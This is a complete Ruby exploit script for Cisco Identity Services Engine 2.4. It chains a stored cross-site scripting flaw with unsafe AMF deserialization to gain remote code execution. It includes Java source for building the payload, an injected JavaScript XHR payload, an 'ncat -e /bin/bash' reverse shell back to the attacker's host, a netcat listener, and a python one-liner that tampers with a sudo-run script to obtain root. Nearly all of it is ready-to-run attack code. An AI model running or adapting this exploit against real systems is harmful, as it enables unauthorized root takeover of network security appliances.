#!/usr/bin/ruby

=begin
Exploit for Cisco Identify Services Engine (ISE), tested on version 2.4.0.357
By Pedro Ribeiro (pedrib@gmail.com) from Agile Information Security, 
and Dominik Czarnota (dominik.b.czarnota@gmail.com)

This exploit starts by abusing a stored cross scripting to deploy malicious Javascript to /admin/LiveLogSettingsServlet (CVE-2018-15440).
The Javascript contains a binary payload that will cause a XHR request to the AMF endpoint on the ISE server, which is vulnerable to CVE-2017-5641 (Unsafe Java AMF deserialization), leading to remote code execution as the iseadminportal user.
This AMF deserialization can only be triggered by an authenticated user, hence why the stored XSS is necessary.
The exploit will wait until the server executes the AMF deserialization payload and spawn netcat to receive a reverse shell from the server.
Once we have code execution as the unprivileged iseadminportal user, we can edit various shell script files under /opt/CSCOcpm/bin/ and run them as sudo, escalating our privileges to root.

This exploit has only been tested in Linux. The two jars described below are required for execution of the exploit, and they should be in the same directory as this script.

==
ysoserial.jar - get the latest version from https://github.com/frohoff/ysoserial/releases
acsFlex.jar - build the following code as a JAR:

import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AmfMessageSerializer;
import java.io.*;

public class ACSFlex {
    public static void main(String[] args) {
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
        // serialize object to AMF message
        try {
            byte[] amf = new byte[0];
            amf = serialize((unicastRef));
            DataOutputStream os = new DataOutputStream(new FileOutputStream(args[2]));
            os.write(amf);
            System.out.println("Done, payload written to " + args[2]);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);

        ActionMessage message = new ActionMessage();
        message.addBody(body);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);

        return out.toByteArray();
    }
}
=end

require 'tmpdir'
require 'net/http'
require 'uri'
require 'openssl'
require 'base64'

class String
	def black;          "\e[30m#{self}\e[0m" end
	def red;            "\e[31m#{self}\e[0m" end
	def green;          "\e[32m#{self}\e[0m" end
	def brown;          "\e[33m#{self}\e[0m" end
	def blue;           "\e[34m#{self}\e[0m" end
	def magenta;        "\e[35m#{self}\e[0m" end
	def cyan;           "\e[36m#{self}\e[0m" end
	def gray;           "\e[37m#{self}\e[0m" end

	def bg_black;       "\e[40m#{self}\e[0m" end
	def bg_red;         "\e[41m#{self}\e[0m" end
	def bg_green;       "\e[42m#{self}\e[0m" end
	def bg_brown;       "\e[43m#{self}\e[0m" end
	def bg_blue;        "\e[44m#{self}\e[0m" end
	def bg_magenta;     "\e[45m#{self}\e[0m" end
	def bg_cyan;        "\e[46m#{self}\e[0m" end
	def bg_gray;        "\e[47m#{self}\e[0m" end

	def bold;           "\e[1m#{self}\e[22m" end
	def italic;         "\e[3m#{self}\e[23m" end
	def underline;      "\e[4m#{self}\e[24m" end
	def blink;          "\e[5m#{self}\e[25m" end
	def reverse_color;  "\e[7m#{self}\e[27m" end
end

puts ""
puts "Cisco Identity Services Engine (ISE) remote code execution as root".cyan.bold
puts "CVE-TODO".cyan.bold
puts "  Tested on ISE virtual appliance 2.4.0.357".cyan.bold
puts "By:".blue.bold 
puts "  Pedro Ribeiro (pedrib@gmail.com) / Agile Information Security".blue.bold
puts "  Dominik Czarnota (dominik.b.czarnota@gmail.com)".blue.bold
puts ""

script_dir = File.expand_path(File.dirname(__FILE__))
ysoserial_jar = File.join(script_dir, 'ysoserial.jar')
acsflex_jar = File.join(script_dir, 'acsFlex.jar')

if (ARGV.length < 3) or not File.exist?(ysoserial_jar) or not File.exist?(acsflex_jar)
	puts "Usage: ./ISEpwn.rb <rhost> <rport> <lhost>".bold
    puts "Spawns a reverse shell from rhost to lhost"
	puts ""
	puts "NOTES:\tysoserial.jar and the included acsFlex.jar must be in this script's directory."
	puts "\tTwo random TCP ports in the range 10000-65535 are used to receive connections from the target."
	puts ""
	exit(-1)
end

# Unfortunately I couldn't find a better way to make this interactive,
# so the user has to copy and paste the python command to write to the shell script 
# and execute as sudo.
# Spent hours fighting with Ruby and trying to get this without user interaction,
# hopefully some Ruby God can enlighten me on how to do it properly.
def start_nc_thread(nc_port, jrmp_pid)
  IO.popen("nc -lvkp #{nc_port.to_s} 2>&1").each do |line|
    if line.include?('Connection from')
      Process.kill("TERM", jrmp_pid)
      Process.wait(jrmp_pid)
      puts "[+] Shelly is here! Now to escalate your privileges to root, ".green.bold +
        "copy and paste the following:".green.bold
      puts %{python -c 'import os;f=open("/opt/CSCOcpm/bin/file-info.sh", "a+", 0);f.write("if [ \\"$1\\" == 1337 ];then\\n/bin/bash\\nfi\\n");f.close();os.system("sudo /opt/CSCOcpm/bin/file-info.sh 1337")'}
      puts "[+] Press enter, then interact with the root shell,".green.bold +  
        " and press CTRL + C when done".green.bold
    else
      puts line
    end
  end
end

YSOSERIAL = "#{ysoserial_jar} ysoserial.exploit.JRMPListener JRMP_PORT ROME"
JS_PAYLOAD = %{<script>function b64toBlob(e,r,a){r=r||"",a=a||512;for(var t=atob(e),n=[],o=0;o<t.length;o+=a){for(var l=t.slice(o,o+a),b=new Array(l.length),h=0;h<l.length;h++)b[h]=l.charCodeAt(h);var p=new Uint8Array(b);n.push(p)}return new Blob(n,{type:r})}b64_payload="<PAYLOAD>";var xhr=new XMLHttpRequest;xhr.open("POST","https://<RHOST>/admin/messagebroker/amfsecure",!0),xhr.send(b64toBlob(b64_payload,"application/x-amf"));</script>}

rhost = ARGV[0]
rport = ARGV[1]
lhost = ARGV[2].dup.force_encoding('ASCII')

Dir.mktmpdir { |temp_dir|

  nc_port = rand(10000..65535)
  puts "[+] Picked port #{nc_port} to receive the shell".cyan.bold
  
  # step 1: create the AMF payload
  puts "[+] Creating AMF payload...".green.bold
  jrmp_port = rand(10000..65535)

  amf_file = temp_dir + "/payload.ser"
  system("java -jar #{acsflex_jar} #{lhost} #{jrmp_port} #{amf_file}")
  amf_payload = File.binread(amf_file)

  # step 2: start the ysoserial JRMP listener
  puts "[+] Picked port #{jrmp_port} for the JRMP server".cyan.bold
  
  # build the command line argument that will be executed by the server
  java = "java -cp #{YSOSERIAL.gsub('JRMP_PORT', jrmp_port.to_s)}"
  cmd = "ncat -e /bin/bash SERVER PORT".gsub("SERVER", lhost).gsub("PORT", nc_port.to_s)
  puts "[+] Sending command #{cmd}".green.bold

  java_split = java.split(' ') << cmd
  jrmp = IO.popen(java_split)
  jrmp_pid = jrmp.pid
  sleep 5

  # step 3: start the netcat reverse shell listener
  t = Thread.new{start_nc_thread(nc_port, jrmp_pid)}
  
  # step 4: fire the XSS payload and wait for our trap to be sprung
  js_payload = JS_PAYLOAD.gsub('<RHOST>', "#{rhost}:#{rport}").
    gsub('<PAYLOAD>', Base64.strict_encode64(amf_payload))
  uri = URI.parse("https://#{rhost}:#{rport}/admin/LiveLogSettingsServlet")
  params = { 
    :Action => "write", 
    :Columns => rand(1..1000).to_s,
    :Rows => js_payload,
    :Refresh_rate => rand(1..1000).to_s,
    :Time_period => rand(1..1000).to_s
  }
  uri.query = URI.encode_www_form( params )

  Net::HTTP.start(uri.host, uri.port, 
                  {:use_ssl => true, :verify_mode => OpenSSL::SSL::VERIFY_NONE }) do |http|
    #http.set_debug_output($stdout)
    res = http.get(uri)
  end

  puts "[+] XSS payload sent. Waiting for an admin to take the bait...".green.bold
  begin
    t.join
  rescue Interrupt
    begin
      Process.kill("TERM", jrmp_pid)
      Process.wait(jrmp_pid)
    rescue Errno::ESRCH
      # if we try to kill a dead process we get this error
    end   
    puts "Exiting..."
  end
}
exit 0
